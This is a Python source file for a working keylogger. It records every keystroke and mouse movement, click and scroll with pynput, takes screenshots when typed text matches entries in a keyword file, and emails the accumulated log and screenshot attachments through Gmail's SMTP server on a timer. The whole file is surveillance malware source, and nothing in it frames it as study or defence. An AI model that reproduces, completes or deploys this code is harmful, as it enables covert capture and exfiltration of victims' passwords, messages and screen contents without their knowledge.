from pynput import mouse, keyboard
import threading, smtplib, os, sys, datetime
from PIL import ImageGrab
from random import randint
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email import encoders

# ==========================================================
#   HANDLE MOUSE AND KEYBOARD AND STORE/SEND LOGS TO EMAIL
# ==========================================================
class Handle_Mouse_Keyboard:

    # --------------------------------------------------------------------------------------
    #   INITIATE CONSTRUCTOR FOR EMAIL, PASSWORD, MAIL TIME INTERVAL, CAPTURE AND INTERRPUT
    # --------------------------------------------------------------------------------------
    def __init__(self, email, password, time_interval, capture, terminate):
        self.log = ''
        self.email = email
        self.password = password
        self.time_interval = time_interval
        self.capture = capture
        self.keyword = [data.strip() for data in open(os.getcwd().replace('\\', '/').replace('Combine', '')+'/keywordfile').read().split(',')]
        self.capture_name = []
        self.count = 1
        self.terminater = terminate
        self.pasttime = datetime.datetime.now()
        self.keyboard_listener = keyboard.Listener(on_press=self.process_on_key)
        self.mouse_listener = mouse.Listener(on_move=self.process_move, on_click=self.process_click, on_scroll=self.process_scroll)

    # ------------------------------------------------------------------------
    #   THIS METHOD ACTIVATES WHEN USE CLICK THE KEYBOARD KEYS AND STORE LOGS
    # ------------------------------------------------------------------------
    def process_on_key(self, key):
        try:
            self.log = self.log + str(key.char)
            if self.capture:
                for key_val in self.keyword:
                    if self.log.__contains__(key_val):
                        rand_num = randint(1, 2000)
                        if os.path.exists('capture'+ str(rand_num) + '.jpg'):
                            name = str(rand_num)
                            ImageGrab.grab().save('capture' + name + '.jpg', 'JPEG')
                            self.capture_name.append(name)
                        else:
                            name = str(rand_num)
                            ImageGrab.grab().save('capture' + name + '.jpg', 'JPEG')
                            self.capture_name.append(name)
                        self.log.replace(key_val, '')
                        break
            else:
                self.log = self.log+str(key.char)
        except:
            if key == keyboard.Key.space:
                self.log = self.log + ' '
            else:
                self.log = self.log + str(key)

    # ----------------------------------------------------------------------
    #   THIS METHOD ACTIVATES WHEN USE MOVES THE CURSOR AND STORE MOVE LOGS
    # ----------------------------------------------------------------------
    def process_move(self, x, y):
        self.log = self.log + ' Pointer Moved to {0}'.format((x,y))

    # ----------------------------------------------------------------------------------------------
    #   THIS METHOD ACTIVATES WHEN USER CLICK THE MOUSE BUTTON (LEFT, MIDDLE, RIGHT) AND STORE LOGS
    # ----------------------------------------------------------------------------------------------
    def process_click(self, x, y, button, pressed):
        if button == mouse.Button.left:
            if self.capture:
                if not pressed:
                    for key_val in self.keyword:
                        if self.log.__contains__(key_val):
                            self.log = self.log + ' Left Button Clicked at {0}'.format((x,y))
                            rand_num = randint(1, 2000)
                            if os.path.exists('capture'+str(rand_num)+'.jpg'):
                                name = str(rand_num)
                                ImageGrab.grab().save('capture'+str(rand_num)+'.jpg', 'JPEG')
                                self.capture_name.append(name)
                            else:
                                name = str(rand_num)
                                ImageGrab.grab().save('capture'+name+'.jpg', 'JPEG')
                                self.capture_name.append(name)
                            self.log.replace(key_val, '')
                            break
            else:
                self.log = self.log + ' Left Button Clicked at {0}'.format((x,y))

        if button == mouse.Button.right:
            self.log = self.log + ' Right Button Clicked'
        if button == mouse.Button.middle:
            self.log = self.log + ' Middle Button Clicked'

    # --------------------------------------------------------------------
    #   THIS METHOD ACTIVATES WHEN USER SCROLLS THE MOUSE AND STORE LOGS
    # --------------------------------------------------------------------
    def process_scroll(self, x, y, dx, dy):
        self.log = self.log + ' Scorlled {0} at {1}'.format('down' if dy < 0 else 'up', (x,y))

    # ---------------------------------------------------------
    #   SEND MAIL TO THE USER WITH CAPTURED IMAGES ATTACHMENT
    # ---------------------------------------------------------
    def send_mail(self, email, password, res):
        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = email
        msg['Subject'] = 'KeyLogger details'
        body = res
        msg.attach(MIMEText(body, 'plain'))
        for img in self.capture_name:
            if os.path.exists('capture' + img + '.jpg'):
                filename = os.getcwd().replace('\\', '/') + '/capture' + img + '.jpg'
                attachment = open(filename, 'rb')
                p = MIMEBase('application', 'octet-stream')
                p.set_payload((attachment).read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', 'attachment; filename=%s' % filename)
                msg.attach(p)
        self.capture_name.clear()
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(email, password)
        text = msg.as_string()
        s.sendmail(email, email, text)
        s.quit()
        print('\r[+] Mail Successfully Sent '+str(self.count)+' times',end='')
        self.count += 1

    # -----------------------------------------------------------------
    #   THIS METHOD SEND ALL LOGS TO USER EMAIL BASED ON TIME INTERVAL
    # -----------------------------------------------------------------
    def report(self):
        present_time = datetime.datetime.now()
        diff_time = (present_time - self.pasttime).seconds
        if diff_time >= self.terminater:
            self.keyboard_listener.stop()
            self.mouse_listener.stop()
            sys.exit(0)
        else:
            self.send_mail(self.email, self.password, self.log)
            self.log = ''
            timer = threading.Timer(self.time_interval, self.report)
            timer.start()

    # -------------------------------------------------------------
    #   MAIN METHOD TO CREATE MOUSE AND KEYBOARD LISTENER THREADS
    # -------------------------------------------------------------
    def run(self):
        self.keyboard_listener.start()
        self.mouse_listener.start()
        self.report()

